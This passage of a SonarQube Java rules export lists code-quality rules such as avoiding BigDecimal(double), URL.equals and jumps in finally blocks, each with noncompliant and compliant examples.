            "htmlDesc": "<p>Because of floating point imprecision, you're unlikely to get the value you expect from the <code>BigDecimal(double)</code> constructor. </p>\n<p>From <a href=\"http://docs.oracle.com/javase/7/docs/api/java/math/BigDecimal.html#BigDecimal(double)\">the JavaDocs</a>:</p>\n<blockquote>\n  The results of this constructor can be somewhat unpredictable. One might assume that writing new BigDecimal(0.1) in Java creates a BigDecimal which\n  is exactly equal to 0.1 (an unscaled value of 1, with a scale of 1), but it is actually equal to\n  0.1000000000000000055511151231257827021181583404541015625. This is because 0.1 cannot be represented exactly as a double (or, for that matter, as a\n  binary fraction of any finite length). Thus, the value that is being passed in to the constructor is not exactly equal to 0.1, appearances\n  notwithstanding.\n</blockquote>\n<p>Instead, you should use <code>BigDecimal.valueOf</code>, which uses a string under the covers to eliminate floating point rounding errors, or the\nconstructor that takes a <code>String</code> argument.</p>\n<h2>Noncompliant Code Example</h2>\n<pre>\ndouble d = 1.1;\n\nBigDecimal bd1 = new BigDecimal(d); // Noncompliant; see comment above\nBigDecimal bd2 = new BigDecimal(1.1); // Noncompliant; same result\n</pre>\n<h2>Compliant Solution</h2>\n<pre>\ndouble d = 1.1;\n\nBigDecimal bd1 = BigDecimal.valueOf(d);\nBigDecimal bd2 = new BigDecimal(\"1.1\"); // using String constructor will result in precise value\n</pre>\n<h2>See</h2>\n<ul>\n  <li> <a href=\"https://wiki.sei.cmu.edu/confluence/x/kzdGBQ\">CERT, NUM10-J.</a> - Do not construct BigDecimal objects from floating-point literals\n  </li>\n</ul>",
            "mdDesc": "<p>Because of floating point imprecision, you're unlikely to get the value you expect from the <code>BigDecimal(double)</code> constructor. </p>\n<p>From <a href=\"http://docs.oracle.com/javase/7/docs/api/java/math/BigDecimal.html#BigDecimal(double)\">the JavaDocs</a>:</p>\n<blockquote>\n  The results of this constructor can be somewhat unpredictable. One might assume that writing new BigDecimal(0.1) in Java creates a BigDecimal which\n  is exactly equal to 0.1 (an unscaled value of 1, with a scale of 1), but it is actually equal to\n  0.1000000000000000055511151231257827021181583404541015625. This is because 0.1 cannot be represented exactly as a double (or, for that matter, as a\n  binary fraction of any finite length). Thus, the value that is being passed in to the constructor is not exactly equal to 0.1, appearances\n  notwithstanding.\n</blockquote>\n<p>Instead, you should use <code>BigDecimal.valueOf</code>, which uses a string under the covers to eliminate floating point rounding errors, or the\nconstructor that takes a <code>String</code> argument.</p>\n<h2>Noncompliant Code Example</h2>\n<pre>\ndouble d = 1.1;\n\nBigDecimal bd1 = new BigDecimal(d); // Noncompliant; see comment above\nBigDecimal bd2 = new BigDecimal(1.1); // Noncompliant; same result\n</pre>\n<h2>Compliant Solution</h2>\n<pre>\ndouble d = 1.1;\n\nBigDecimal bd1 = BigDecimal.valueOf(d);\nBigDecimal bd2 = new BigDecimal(\"1.1\"); // using String constructor will result in precise value\n</pre>\n<h2>See</h2>\n<ul>\n  <li> <a href=\"https://wiki.sei.cmu.edu/confluence/x/kzdGBQ\">CERT, NUM10-J.</a> - Do not construct BigDecimal objects from floating-point literals\n  </li>\n</ul>",
            "severity": "MAJOR",
            "status": "READY",
            "isTemplate": false,
            "tags": [],
            "sysTags": [
                "cert"
            ],
            "lang": "java",
            "langName": "Java",
            "params": [],
            "defaultDebtRemFnType": "CONSTANT_ISSUE",
            "defaultDebtRemFnOffset": "5min",
            "debtOverloaded": false,
            "debtRemFnType": "CONSTANT_ISSUE",
            "debtRemFnOffset": "5min",
            "defaultRemFnType": "CONSTANT_ISSUE",
            "defaultRemFnBaseEffort": "5min",
            "remFnType": "CONSTANT_ISSUE",
            "remFnBaseEffort": "5min",
            "remFnOverloaded": false,
            "scope": "MAIN",
            "isExternal": false,
            "type": "BUG"
        },
        {
            "key": "java:S2232",
            "repo": "java",
            "name": "\"ResultSet.isLast()\" should not be used",
            "createdAt": "2022-09-26T07:32:37+0000",
            "htmlDesc": "<p>There are several reasons to avoid <code>ResultSet.isLast()</code>. First, support for this method is optional for <code>TYPE_FORWARD_ONLY</code>\nresult sets. Second, it can be expensive (the driver may need to fetch the next row to answer the question). Finally, the specification is not clear\non what should be returned when the <code>ResultSet</code> is empty, so some drivers may return the opposite of what is expected.</p>\n<h2>Noncompliant Code Example</h2>\n<pre>\nstmt.executeQuery(\"SELECT name, address FROM PERSON\");\nResultSet rs = stmt.getResultSet();\nwhile (! rs.isLast()) { // Noncompliant\n  // process row\n}\n</pre>\n<h2>Compliant Solution</h2>\n<pre>\nResultSet rs = stmt.executeQuery(\"SELECT name, address FROM PERSON\");\nwhile (rs.next()) {\n  // process row\n}\n</pre>",
            "mdDesc": "<p>There are several reasons to avoid <code>ResultSet.isLast()</code>. First, support for this method is optional for <code>TYPE_FORWARD_ONLY</code>\nresult sets. Second, it can be expensive (the driver may need to fetch the next row to answer the question). Finally, the specification is not clear\non what should be returned when the <code>ResultSet</code> is empty, so some drivers may return the opposite of what is expected.</p>\n<h2>Noncompliant Code Example</h2>\n<pre>\nstmt.executeQuery(\"SELECT name, address FROM PERSON\");\nResultSet rs = stmt.getResultSet();\nwhile (! rs.isLast()) { // Noncompliant\n  // process row\n}\n</pre>\n<h2>Compliant Solution</h2>\n<pre>\nResultSet rs = stmt.executeQuery(\"SELECT name, address FROM PERSON\");\nwhile (rs.next()) {\n  // process row\n}\n</pre>",
            "severity": "MAJOR",
            "status": "READY",
            "isTemplate": false,
            "tags": [],
            "sysTags": [
                "performance",
                "pitfall",
                "sql"
            ],
            "lang": "java",
            "langName": "Java",
            "params": [],
            "defaultDebtRemFnType": "CONSTANT_ISSUE",
            "defaultDebtRemFnOffset": "10min",
            "debtOverloaded": false,
            "debtRemFnType": "CONSTANT_ISSUE",
            "debtRemFnOffset": "10min",
            "defaultRemFnType": "CONSTANT_ISSUE",
            "defaultRemFnBaseEffort": "10min",
            "remFnType": "CONSTANT_ISSUE",
            "remFnBaseEffort": "10min",
            "remFnOverloaded": false,
            "scope": "MAIN",
            "isExternal": false,
            "type": "CODE_SMELL"
        },
        {
            "key": "java:S2112",
            "repo": "java",
            "name": "\"URL.hashCode\" and \"URL.equals\" should be avoided",
            "createdAt": "2022-09-26T07:32:37+0000",
            "htmlDesc": "<p>The <code>equals</code> and <code>hashCode</code> methods of <code>java.net.URL</code> both may trigger a name service (usually DNS) lookup to\nresolve the host name or IP address. Depending on the configuration, and network status, that can take a long time. <code>URI</code> on the other hand\nmakes no such calls and should be used instead unless the specific <code>URL</code> functionality is required.</p>\n<p>In general it is better to use the <code>URI</code> class until access to the resource is actually needed, at which point you can just convert the\n<code>URI</code> to a <code>URL</code> using <code>URI.toURL()</code>.</p>\n<p>This rule checks for uses of <code>URL</code> 's in <code>Map</code> and <code>Set</code> , and for explicit calls to the <code>equals</code> and\n<code>hashCode</code> methods.</p>\n<h2>Noncompliant Code Example</h2>\n<pre>\npublic void checkUrl(URL url) {\n  Set&lt;URL&gt; sites = new HashSet&lt;URL&gt;();  // Noncompliant\n\n  URL homepage = new URL(\"http://sonarsource.com\");  // Compliant\n  if (homepage.equals(url)) { // Noncompliant\n    // ...\n  }\n}\n</pre>\n<h2>Compliant Solution</h2>\n<pre>\npublic void checkUrl(URL url) {\n  Set&lt;URI&gt; sites = new HashSet&lt;URI&gt;();  // Compliant\n\n  URI homepage = new URI(\"http://sonarsource.com\");  // Compliant\n  URI uri = url.toURI();\n  if (homepage.equals(uri)) {  // Compliant\n    // ...\n  }\n}\n</pre>",
            "mdDesc": "<p>The <code>equals</code> and <code>hashCode</code> methods of <code>java.net.URL</code> both may trigger a name service (usually DNS) lookup to\nresolve the host name or IP address. Depending on the configuration, and network status, that can take a long time. <code>URI</code> on the other hand\nmakes no such calls and should be used instead unless the specific <code>URL</code> functionality is required.</p>\n<p>In general it is better to use the <code>URI</code> class until access to the resource is actually needed, at which point you can just convert the\n<code>URI</code> to a <code>URL</code> using <code>URI.toURL()</code>.</p>\n<p>This rule checks for uses of <code>URL</code> 's in <code>Map</code> and <code>Set</code> , and for explicit calls to the <code>equals</code> and\n<code>hashCode</code> methods.</p>\n<h2>Noncompliant Code Example</h2>\n<pre>\npublic void checkUrl(URL url) {\n  Set&lt;URL&gt; sites = new HashSet&lt;URL&gt;();  // Noncompliant\n\n  URL homepage = new URL(\"http://sonarsource.com\");  // Compliant\n  if (homepage.equals(url)) { // Noncompliant\n    // ...\n  }\n}\n</pre>\n<h2>Compliant Solution</h2>\n<pre>\npublic void checkUrl(URL url) {\n  Set&lt;URI&gt; sites = new HashSet&lt;URI&gt;();  // Compliant\n\n  URI homepage = new URI(\"http://sonarsource.com\");  // Compliant\n  URI uri = url.toURI();\n  if (homepage.equals(uri)) {  // Compliant\n    // ...\n  }\n}\n</pre>",
            "severity": "MAJOR",
            "status": "READY",
            "isTemplate": false,
            "tags": [],
            "sysTags": [
                "performance"
            ],
            "lang": "java",
            "langName": "Java",
            "params": [],
            "defaultDebtRemFnType": "CONSTANT_ISSUE",
            "defaultDebtRemFnOffset": "20min",
            "debtOverloaded": false,
            "debtRemFnType": "CONSTANT_ISSUE",
            "debtRemFnOffset": "20min",
            "defaultRemFnType": "CONSTANT_ISSUE",
            "defaultRemFnBaseEffort": "20min",
            "remFnType": "CONSTANT_ISSUE",
            "remFnBaseEffort": "20min",
            "remFnOverloaded": false,
            "scope": "MAIN",
            "isExternal": false,
            "type": "CODE_SMELL"
        },
        {
            "key": "java:S5860",
            "repo": "java",
            "name": "Names of regular expressions named groups should be used",
            "createdAt": "2022-09-26T07:32:37+0000",
            "htmlDesc": "<p>Why use named groups only to never use any of them later on in the code?</p>\n<p>This rule raises issues every time named groups are:</p>\n<p> * defined but never called anywhere in the code through their name;</p>\n<p> * defined but called elsewhere in the code by their number instead.</p>\n<h2>Noncompliant Code Example</h2>\n<pre>\nString date = \"01/02\";\n\nPattern datePattern = Pattern.compile(\"(?&lt;month&gt;[0-9]{2})/(?&lt;year&gt;[0-9]{2})\");\nMatcher dateMatcher = datePattern.matcher(date);\n\nif (dateMatcher.matches()) {\n  checkValidity(dateMatcher.group(1), dateMatcher.group(2));  // Noncompliant - numbers instead of names of groups are used\n  checkValidity(dateMatcher.group(\"day\")); // Noncompliant - there is no group called \"day\"\n}\n\n// ...\n\nString score = \"14:1\";\n\nPattern scorePattern = Pattern.compile(\"(?&lt;player1&gt;[0-9]+):(?&lt;player2&gt;[0-9]+)\"); // Noncompliant - named groups are never used\nMatcher scoreMatcher = scorePattern.matcher(score);\n\nif (scoreMatcher.matches()) {\n  checkScore(score);\n}\n</pre>\n<h2>Compliant Solution</h2>\n<pre>\nString date = \"01/02\";\n\nPattern datePattern = Pattern.compile(\"(?&lt;month&gt;[0-9]{2})/(?&lt;year&gt;[0-9]{2})\");\nMatcher dateMatcher = datePattern.matcher(date);\n\nif (dateMatcher.matches()) {\n  checkValidity(dateMatcher.group(\"month\"), dateMatcher.group(\"year\"));\n}\n\n// ...\n\nString score = \"14:1\";\n\nPattern scorePattern = Pattern.compile(\"(?&lt;player1&gt;[0-9]+):(?&lt;player2&gt;[0-9]+)\");\nMatcher scoreMatcher = scorePattern.matcher(score);\n\nif (scoreMatcher.matches()) {\n  checkScore(scoreMatcher.group(\"player1\"));\n  checkScore(scoreMatcher.group(\"player2\"));\n}\n</pre>\n<p>Or, using dedicated variables instead of group names:</p>\n<pre>\nString score = \"14:1\";\n\nString player = \"([0-9]+)\";\nString gameScore = player + \":\" + player;\n\nPattern scorePattern = Pattern.compile(gameScore);\nMatcher scoreMatcher = scorePattern.matcher(score);\n\nif (scoreMatcher.matches()) {\n  checkScore(score);\n}\n</pre>",
            "mdDesc": "<p>Why use named groups only to never use any of them later on in the code?</p>\n<p>This rule raises issues every time named groups are:</p>\n<p> * defined but never called anywhere in the code through their name;</p>\n<p> * defined but called elsewhere in the code by their number instead.</p>\n<h2>Noncompliant Code Example</h2>\n<pre>\nString date = \"01/02\";\n\nPattern datePattern = Pattern.compile(\"(?&lt;month&gt;[0-9]{2})/(?&lt;year&gt;[0-9]{2})\");\nMatcher dateMatcher = datePattern.matcher(date);\n\nif (dateMatcher.matches()) {\n  checkValidity(dateMatcher.group(1), dateMatcher.group(2));  // Noncompliant - numbers instead of names of groups are used\n  checkValidity(dateMatcher.group(\"day\")); // Noncompliant - there is no group called \"day\"\n}\n\n// ...\n\nString score = \"14:1\";\n\nPattern scorePattern = Pattern.compile(\"(?&lt;player1&gt;[0-9]+):(?&lt;player2&gt;[0-9]+)\"); // Noncompliant - named groups are never used\nMatcher scoreMatcher = scorePattern.matcher(score);\n\nif (scoreMatcher.matches()) {\n  checkScore(score);\n}\n</pre>\n<h2>Compliant Solution</h2>\n<pre>\nString date = \"01/02\";\n\nPattern datePattern = Pattern.compile(\"(?&lt;month&gt;[0-9]{2})/(?&lt;year&gt;[0-9]{2})\");\nMatcher dateMatcher = datePattern.matcher(date);\n\nif (dateMatcher.matches()) {\n  checkValidity(dateMatcher.group(\"month\"), dateMatcher.group(\"year\"));\n}\n\n// ...\n\nString score = \"14:1\";\n\nPattern scorePattern = Pattern.compile(\"(?&lt;player1&gt;[0-9]+):(?&lt;player2&gt;[0-9]+)\");\nMatcher scoreMatcher = scorePattern.matcher(score);\n\nif (scoreMatcher.matches()) {\n  checkScore(scoreMatcher.group(\"player1\"));\n  checkScore(scoreMatcher.group(\"player2\"));\n}\n</pre>\n<p>Or, using dedicated variables instead of group names:</p>\n<pre>\nString score = \"14:1\";\n\nString player = \"([0-9]+)\";\nString gameScore = player + \":\" + player;\n\nPattern scorePattern = Pattern.compile(gameScore);\nMatcher scoreMatcher = scorePattern.matcher(score);\n\nif (scoreMatcher.matches()) {\n  checkScore(score);\n}\n</pre>",
            "severity": "MAJOR",
            "status": "READY",
            "isTemplate": false,
            "tags": [],
            "sysTags": [
                "regex"
            ],
            "lang": "java",
            "langName": "Java",
            "params": [],
            "defaultDebtRemFnType": "CONSTANT_ISSUE",
            "defaultDebtRemFnOffset": "10min",
            "debtOverloaded": false,
            "debtRemFnType": "CONSTANT_ISSUE",
            "debtRemFnOffset": "10min",
            "defaultRemFnType": "CONSTANT_ISSUE",
            "defaultRemFnBaseEffort": "10min",
            "remFnType": "CONSTANT_ISSUE",
            "remFnBaseEffort": "10min",
            "remFnOverloaded": false,
            "scope": "MAIN",
            "isExternal": false,
            "type": "CODE_SMELL"
        },
        {
            "key": "java:S1143",
            "repo": "java",
            "name": "Jump statements should not occur in \"finally\" blocks",
            "createdAt": "2022-09-26T07:32:37+0000",
            "htmlDesc": "<p>Using <code>return</code>, <code>break</code>, <code>throw</code>, and so on from a <code>finally</code> block suppresses the propagation of any\nunhandled <code>Throwable</code> which was thrown in the <code>try</code> or <code>catch</code> block.</p>\n<p>This rule raises an issue when a jump statement (<code>break</code>, <code>continue</code>, <code>return</code>, <code>throw</code>, and\n<code>goto</code>) would force control flow to leave a <code>finally</code> block. </p>\n<h2>Noncompliant Code Example</h2>\n<pre>\npublic static void main(String[] args) {\n  try {\n    doSomethingWhichThrowsException();\n    System.out.println(\"OK\");   // incorrect \"OK\" message is printed\n  } catch (RuntimeException e) {\n    System.out.println(\"ERROR\");  // this message is not shown\n  }\n}\n\npublic static void doSomethingWhichThrowsException() {\n  try {\n    throw new RuntimeException();\n  } finally {\n    for (int i = 0; i &lt; 10; i ++) {\n      //...\n      if (q == i) {\n        break; // ignored\n      }\n    }\n\n    /* ... */\n    return;      // Noncompliant - prevents the RuntimeException from being propagated\n  }\n}\n</pre>\n<h2>Compliant Solution</h2>\n<pre>\npublic static void main(String[] args) {\n  try {\n    doSomethingWhichThrowsException();\n    System.out.println(\"OK\");\n  } catch (RuntimeException e) {\n    System.out.println(\"ERROR\");  // \"ERROR\" is printed as expected\n  }\n}\n\npublic static void doSomethingWhichThrowsException() {\n  try {\n    throw new RuntimeException();\n  } finally {\n    for (int i = 0; i &lt; 10; i ++) {\n      //...\n      if (q == i) {\n        break; // ignored\n      }\n    }\n\n    /* ... */\n  }\n}\n</pre>\n<h2>See</h2>\n<ul>\n  <li> <a href=\"http://cwe.mitre.org/data/definitions/584.html\">MITRE, CWE-584</a> - Return Inside Finally Block </li>\n  <li> <a href=\"https://wiki.sei.cmu.edu/confluence/x/BTdGBQ\">CERT, ERR04-J.</a> - Do not complete abruptly from a finally block </li>\n</ul>",
            "mdDesc": "<p>Using <code>return</code>, <code>break</code>, <code>throw</code>, and so on from a <code>finally</code> block suppresses the propagation of any\nunhandled <code>Throwable</code> which was thrown in the <code>try</code> or <code>catch</code> block.</p>\n<p>This rule raises an issue when a jump statement (<code>break</code>, <code>continue</code>, <code>return</code>, <code>throw</code>, and\n<code>goto</code>) would force control flow to leave a <code>finally</code> block. </p>\n<h2>Noncompliant Code Example</h2>\n<pre>\npublic static void main(String[] args) {\n  try {\n    doSomethingWhichThrowsException();\n    System.out.println(\"OK\");   // incorrect \"OK\" message is printed\n  } catch (RuntimeException e) {\n    System.out.println(\"ERROR\");  // this message is not shown\n  }\n}\n\npublic static void doSomethingWhichThrowsException() {\n  try {\n    throw new RuntimeException();\n  } finally {\n    for (int i = 0; i &lt; 10; i ++) {\n      //...\n      if (q == i) {\n        break; // ignored\n      }\n    }\n\n    /* ... */\n    return;      // Noncompliant - prevents the RuntimeException from being propagated\n  }\n}\n</pre>\n<h2>Compliant Solution</h2>\n<pre>\npublic static void main(String[] args) {\n  try {\n    doSomethingWhichThrowsException();\n    System.out.println(\"OK\");\n  } catch (RuntimeException e) {\n    System.out.println(\"ERROR\");  // \"ERROR\" is printed as expected\n  }\n}\n\npublic static void doSomethingWhichThrowsException() {\n  try {\n    throw new RuntimeException();\n  } finally {\n    for (int i = 0; i &lt; 10; i ++) {\n      //...\n      if (q == i) {\n        break; // ignored\n      }\n    }\n\n    /* ... */\n  }\n}\n</pre>\n<h2>See</h2>\n<ul>\n  <li> <a href=\"http://cwe.mitre.org/data/definitions/584.html\">MITRE, CWE-584</a> - Return Inside Finally Block </li>\n  <li> <a href=\"https://wiki.sei.cmu.edu/confluence/x/BTdGBQ\">CERT, ERR04-J.</a> - Do not complete abruptly from a finally block </li>\n</ul>",
            "severity": "CRITICAL",
            "status": "READY",
            "isTemplate": false,
            "tags": [],
            "sysTags": [
                "cert",
                "cwe",
                "error-handling"
            ],
            "lang": "java",
            "langName": "Java",
            "params": [],
            "defaultDebtRemFnType": "CONSTANT_ISSUE",
            "defaultDebtRemFnOffset": "30min",
            "debtOverloaded": false,
            "debtRemFnType": "CONSTANT_ISSUE",
            "debtRemFnOffset": "30min",
            "defaultRemFnType": "CONSTANT_ISSUE",
            "defaultRemFnBaseEffort": "30min",
            "remFnType": "CONSTANT_ISSUE",
            "remFnBaseEffort": "30min",
            "remFnOverloaded": false,
            "scope": "MAIN",
            "isExternal": false,
            "type": "BUG"
        },
        {
            "key": "java:S1264",
            "repo": "java",
            "name": "A \"while\" loop should be used instead of a \"for\" loop",
            "createdAt": "2022-09-26T07:32:37+0000",
            "htmlDesc": "<p>When only the condition expression is defined in a <code>for</code> loop, and the initialization and increment expressions are missing, a\n<code>while</code> loop should be used instead to increase readability. </p>\n<h2>Noncompliant Code Example</h2>\n<pre>\nfor (;condition;) { /*...*/ }\n</pre>\n<h2>Compliant Solution</h2>\n<pre>\nwhile (condition) { /*...*/ }\n</pre>",
            "mdDesc": "<p>When only the condition expression is defined in a <code>for</code> loop, and the initialization and increment expressions are missing, a\n<code>while</code> loop should be used instead to increase readability. </p>\n<h2>Noncompliant Code Example</h2>\n<pre>\nfor (;condition;) { /*...*/ }\n</pre>\n<h2>Compliant Solution</h2>\n<pre>\nwhile (condition) { /*...*/ }\n</pre>",
            "severity": "MINOR",
            "status": "READY",
            "isTemplate": false,
            "tags": [],
            "sysTags": [
                "clumsy"
            ],
            "lang": "java",
            "langName": "Java",
            "params": [],
            "defaultDebtRemFnType": "CONSTANT_ISSUE",
            "defaultDebtRemFnOffset": "5min",
            "debtOverloaded": false,
            "debtRemFnType": "CONSTANT_ISSUE",
            "debtRemFnOffset": "5min",
            "defaultRemFnType": "CONSTANT_ISSUE",
            "defaultRemFnBaseEffort": "5min",
            "remFnType": "CONSTANT_ISSUE",
            "remFnBaseEffort": "5min",
            "remFnOverloaded": false,
            "scope": "MAIN",
            "isExternal": false,
            "type": "CODE_SMELL"
        },
        {
            "key": "java:S5863",
            "repo": "java",
            "name": "Assertions should not compare an object to itself",
            "createdAt": "2022-09-26T07:32:37+0000",
            "htmlDesc": "<p>Assertions comparing an object to itself are more likely to be bugs due to developer's carelessness.</p>\n<p>This rule raises an issue when the actual expression matches the expected expression.</p>\n<h2>Noncompliant Code Example</h2>\n<pre>\nassertThat(actual).isEqualTo(actual); // Noncompliant\n</pre>\n<h2>Compliant Solution</h2>\n<pre>\nassertThat(actual).isEqualTo(expected);\n</pre>\n<h2>Exceptions</h2>\n<p>In a unit test validating the <code>equals(...)</code> and <code>hashCode()</code> methods, it's legitimate to compare an object to itself. This\nrule does not raise an issue for <code>isEqualTo</code>, <code>assertEquals</code> or <code>hasSameHashCodeAs</code> when the unit test name contains\n(case insensitive): <code>equal</code>, <code>hash_?code</code>, <code>object_?method</code>. For example, in tests with the following names:\n<code>test_equals</code>, <code>testEqual</code>, <code>test_hashCode</code>, <code>test_hash_code</code>, <code>test_object_methods</code>.</p>\n<pre>\nclass MyClassTest {\n  @Test\n  void test_equals_and_hash_code() {\n    MyClass obj = new MyClass();\n    assertThat(obj).isEqualTo(obj); // Compliant\n    assertThat(obj).hasSameHashCodeAs(obj); // Compliant\n  }\n}\n</pre>",
            "mdDesc": "<p>Assertions comparing an object to itself are more likely to be bugs due to developer's carelessness.</p>\n<p>This rule raises an issue when the actual expression matches the expected expression.</p>\n<h2>Noncompliant Code Example</h2>\n<pre>\nassertThat(actual).isEqualTo(actual); // Noncompliant\n</pre>\n<h2>Compliant Solution</h2>\n<pre>\nassertThat(actual).isEqualTo(expected);\n</pre>\n<h2>Exceptions</h2>\n<p>In a unit test validating the <code>equals(...)</code> and <code>hashCode()</code> methods, it's legitimate to compare an object to itself. This\nrule does not raise an issue for <code>isEqualTo</code>, <code>assertEquals</code> or <code>hasSameHashCodeAs</code> when the unit test name contains\n(case insensitive): <code>equal</code>, <code>hash_?code</code>, <code>object_?method</code>. For example, in tests with the following names:\n<code>test_equals</code>, <code>testEqual</code>, <code>test_hashCode</code>, <code>test_hash_code</code>, <code>test_object_methods</code>.</p>\n<pre>\nclass MyClassTest {\n  @Test\n  void test_equals_and_hash_code() {\n    MyClass obj = new MyClass();\n    assertThat(obj).isEqualTo(obj); // Compliant\n    assertThat(obj).hasSameHashCodeAs(obj); // Compliant\n  }\n}\n</pre>",
            "severity": "MAJOR",
            "status": "READY",
            "isTemplate": false,
            "tags": [],
            "sysTags": [
                "tests"
            ],
            "lang": "java",
            "langName": "Java",
            "params": [],
            "defaultDebtRemFnType": "CONSTANT_ISSUE",
            "defaultDebtRemFnOffset": "5min",
            "debtOverloaded": false,
            "debtRemFnType": "CONSTANT_ISSUE",
            "debtRemFnOffset": "5min",
            "defaultRemFnType": "CONSTANT_ISSUE",
            "defaultRemFnBaseEffort": "5min",
            "remFnType": "CONSTANT_ISSUE",
            "remFnBaseEffort": "5min",
            "remFnOverloaded": false,
            "scope": "MAIN",
            "isExternal": false,
            "type": "BUG"
        },
        {
            "key": "java:S1142",
            "repo": "java",
            "name": "Methods should not have too many return statements",
            "createdAt": "2022-09-26T07:32:37+0000",
            "htmlDesc": "<p>Having too many return statements in a method increases the method's essential complexity because the flow of execution is broken each time a\nreturn statement is encountered. This makes it harder to read and understand the logic of the method.</p>\n<h2>Noncompliant Code Example</h2>\n<p>With the default threshold of 3:</p>\n<pre>\npublic boolean myMethod() { // Noncompliant; there are 4 return statements\n  if (condition1) {\n    return true;\n  } else {\n    if (condition2) {\n      return false;\n    } else {\n      return true;\n    }\n  }\n  return false;\n}\n</pre>",
            "mdDesc": "<p>Having too many return statements in a method increases the method's essential complexity because the flow of execution is broken each time a\nreturn statement is encountered. This makes it harder to read and understand the logic of the method.</p>\n<h2>Noncompliant Code Example</h2>\n<p>With the default threshold of 3:</p>\n<pre>\npublic boolean myMethod() { // Noncompliant; there are 4 return statements\n  if (condition1) {\n    return true;\n  } else {\n    if (condition2) {\n      return false;\n    } else {\n      return true;\n    }\n  }\n  return false;\n}\n</pre>",
            "severity": "MAJOR",
            "status": "READY",
            "isTemplate": false,
            "tags": [],
            "sysTags": [
                "brain-overload"
            ],
            "lang": "java",
            "langName": "Java",
            "params": [
                {
                    "key": "max",
                    "htmlDesc": "Maximum allowed return statements per method",
                    "defaultValue": "3",
                    "type": "INTEGER"
                }
            ],
            "defaultDebtRemFnType": "CONSTANT_ISSUE",
            "defaultDebtRemFnOffset": "20min",
            "debtOverloaded": false,
            "debtRemFnType": "CONSTANT_ISSUE",
            "debtRemFnOffset": "20min",
            "defaultRemFnType": "CONSTANT_ISSUE",
            "defaultRemFnBaseEffort": "20min",
            "remFnType": "CONSTANT_ISSUE",
            "remFnBaseEffort": "20min",
            "remFnOverloaded": false,
            "scope": "MAIN",
            "isExternal": false,
            "type": "CODE_SMELL"
        },
        {
            "key": "java:S2230",
            "repo": "java",
            "name": "Non-public methods should not be \"@Transactional\"",
            "createdAt": "2022-09-26T07:32:37+0000",
            "htmlDesc": "<p>Marking a non-public method <code>@Transactional</code> is both useless and misleading because Spring doesn't \"see\" non-<code>public</code>\nmethods, and so makes no provision for their proper invocation. Nor does Spring make provision for the methods invoked by the method it called.</p>\n<p>Therefore marking a <code>private</code> method, for instance, <code>@Transactional</code> can only result in a runtime error or exception if the\nmethod is actually written to be <code>@Transactional</code>.</p>\n<h2>Noncompliant Code Example</h2>\n<pre>\n@Transactional  // Noncompliant\nprivate void doTheThing(ArgClass arg) {\n  // ...\n}\n</pre>",
            "mdDesc": "<p>Marking a non-public method <code>@Transactional</code> is both useless and misleading because Spring doesn't \"see\" non-<code>public</code>\nmethods, and so makes no provision for their proper invocation. Nor does Spring make provision for the methods invoked by the method it called.</p>\n<p>Therefore marking a <code>private</code> method, for instance, <code>@Transactional</code> can only result in a runtime error or exception if the\nmethod is actually written to be <code>@Transactional</code>.</p>\n<h2>Noncompliant Code Example</h2>\n<pre>\n@Transactional  // Noncompliant\nprivate void doTheThing(ArgClass arg) {\n  // ...\n}\n</pre>",
            "severity": "MAJOR",
            "status": "READY",
            "isTemplate": false,
            "tags": [],
            "sysTags": [
                "spring"
            ],
            "lang": "java",
            "langName": "Java",
            "params": [],
            "defaultDebtRemFnType": "CONSTANT_ISSUE",
            "defaultDebtRemFnOffset": "20min",
            "debtOverloaded": false,
            "debtRemFnType": "CONSTANT_ISSUE",
            "debtRemFnOffset": "20min",
            "defaultRemFnType": "CONSTANT_ISSUE",
            "defaultRemFnBaseEffort": "20min",
            "remFnType": "CONSTANT_ISSUE",
            "remFnBaseEffort": "20min",
            "remFnOverloaded": false,
            "scope": "MAIN",
            "isExternal": false,
            "type": "BUG"
        },
        {
            "key": "java:S1141",
            "repo": "java",
            "name": "Try-catch blocks should not be nested",
            "createdAt": "2022-09-26T07:32:37+0000",
            "htmlDesc": "<p>Nesting <code>try</code>/<code>catch</code> blocks severely impacts the readability of source code because it makes it too difficult to understand\nwhich block will catch which exception.</p>",
            "mdDesc": "<p>Nesting <code>try</code>/<code>catch</code> blocks severely impacts the readability of source code because it makes it too difficult to understand\nwhich block will catch which exception.</p>",
            "severity": "MAJOR",
            "status": "READY",
            "isTemplate": false,
            "tags": [],
            "sysTags": [
                "confusing",
                "error-handling"
            ],
            "lang": "java",
            "langName": "Java",
            "params": [],
            "defaultDebtRemFnType": "CONSTANT_ISSUE",
            "defaultDebtRemFnOffset": "20min",
            "debtOverloaded": false,
            "debtRemFnType": "CONSTANT_ISSUE",
            "debtRemFnOffset": "20min",
            "defaultRemFnType": "CONSTANT_ISSUE",
            "defaultRemFnBaseEffort": "20min",
            "remFnType": "CONSTANT_ISSUE",
            "remFnBaseEffort": "20min",
            "remFnOverloaded": false,
            "scope": "MAIN",
            "isExternal": false,
            "type": "CODE_SMELL"
        },
        {
            "key": "java:S2110",
            "repo": "java",
            "name": "Invalid \"Date\" values should not be used",
            "createdAt": "2022-09-26T07:32:37+0000",
            "htmlDesc": "<p>Whether the valid value ranges for <code>Date</code> fields start with 0 or 1 varies by field. For instance, month starts at 0, and day of month\nstarts at 1. Enter a date value that goes past the end of the valid range, and the date will roll without error or exception. For instance, enter 12\nfor month, and you'll get January of the following year.</p>\n<p>This rule checks for bad values used in conjunction with <code>java.util.Date</code>, <code>java.sql.Date</code>, and\n<code>java.util.Calendar</code>. Specifically, values outside of the valid ranges:</p>\n<table>\n  <tbody>\n    <tr>\n      <th>Field</th>\n      <th>Valid</th>\n    </tr>\n    <tr>\n      <td>month</td>\n      <td>0-11</td>\n    </tr>\n    <tr>\n      <td>date (day)</td>\n      <td>0-31</td>\n    </tr>\n    <tr>\n      <td>hour</td>\n      <td>0-23</td>\n    </tr>\n    <tr>\n      <td>minute</td>\n      <td>0-60</td>\n    </tr>\n    <tr>\n      <td>second</td>\n      <td>0-61</td>\n    </tr>\n  </tbody>\n</table>\n<p>Note that this rule does not check for invalid leap years, leap seconds (second = 61), or invalid uses of the 31st day of the month.</p>\n<h2>Noncompliant Code Example</h2>\n<pre>\nDate d = new Date();\nd.setDate(25);\nd.setYear(2014);\nd.setMonth(12);  // Noncompliant; rolls d into the next year\n\nCalendar c = new GregorianCalendar(2014, 12, 25);  // Noncompliant\nif (c.get(Calendar.MONTH) == 12) {  // Noncompliant; invalid comparison\n  // ...\n}\n</pre>\n<h2>Compliant Solution</h2>\n<pre>\nDate d = new Date();\nd.setDate(25);\nd.setYear(2014);\nd.setMonth(11);\n\nCalendar c = new Gregorian Calendar(2014, 11, 25);\nif 